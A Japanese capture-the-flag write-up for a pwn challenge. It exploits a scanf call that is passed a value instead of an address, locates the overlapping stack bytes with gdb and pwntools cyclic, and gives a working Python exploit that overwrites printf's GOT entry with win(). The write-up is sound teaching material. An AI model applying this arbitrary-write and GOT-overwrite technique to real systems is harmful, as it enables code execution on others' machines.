# Noob programmer

https://alpacahack.com/daily/challenges/noob-programmer

## 問題の概要

サーバーで動いている C 言語プログラムで `win()` 関数を呼び出すとフラグが得られます。
プログラムでは `show_welcome()` と `ask_room_number()` が順に呼び出されます。

```c
void show_welcome() {
    char name[0x20];
    printf("Input your name> ");
    fgets(name,sizeof(name),stdin);
    printf("Welcome! %s",name);
}
```

```c
void ask_room_number() {
    long age;
    printf("Input your room number> ");
    scanf("%ld",age);
    printf("Ok! I'll visit your room!");
}
```

## 問題の分析

C 言語 Noob なのでぱっと見でどこが問題なので分かりませんでした。

`-Wall` でコンパイルしてみると、`scanf` の引数にアドレスを渡していないという警告が確認できます。

```c
scanf("%ld",age);
```

を実行すると `long age` の値が `long *` として解釈され、`age` が指すアドレスに 8 バイトの値が書き込まれます。

`show_welcome()` の `name[0x20]` で使用されたスタック領域と `ask_room_number()` の `age` で使用されたスタック領域が重なっていれば、`name[0x20]` の入力時に `age` が指すアドレスを指定して任意のアドレスに 8 バイトの値を書き込むことができます。

## 重なっているアドレスの確認

gdb で `name` と `age` のアドレスを確認してもよいですが、`name` に特定のパターンの文字列を入力して、`age` にそのパターンが書き込まれるか確認するのが簡単です。

pwntools を使用すると 4 バイト単位で位置を特定できるパターンを生成できます。

```bash
pwn cyclic 32
# => aaaabaaacaaadaaaeaaafaaagaaahaaa
```

gdb で `scanf` にブレークポイントを設定して、`age` の値を確認します。
`info functions` で `scanf` の関数名を確認できます。
第 2 引数の `age` は `rsi` レジスタに渡されるので、`rsi` の値を確認します。

```bash
(gdb) break __isoc99_scanf@plt
(gdb) run
Input your name> aaaabaaacaaadaaaeaaafaaagaaahaaa
Input your room number>
(gdb) p/x $rsi
$1 = 0x61616861616167
```

`pwntools cyclic -l` で特定のパターンがどの位置にあるか確認できます。

```bash
pwn cyclic -l 0x61616861616167
# => 24
```

`name[0x20]` の 24～31 バイト目が `age` にあたることが分かります。

## 実行方法

`printf` の GOT を `win()` のアドレスに書き換えることで、`printf("Ok! I'll visit your room!");` の部分で `win()` を呼び出すことができます。

```python
from pwn import ELF

elf = ELF("chal", checksec=False)

data = bytearray([0] * 0x20)
data[0x18:0x20] = elf.symbols["got.printf"].to_bytes(8, "little")

os.write(1, data[:-1])
print(elf.symbols["win"])

print("cat flag.txt")
```

```bash
python3 gen-input.py | nc localhost 9999
```
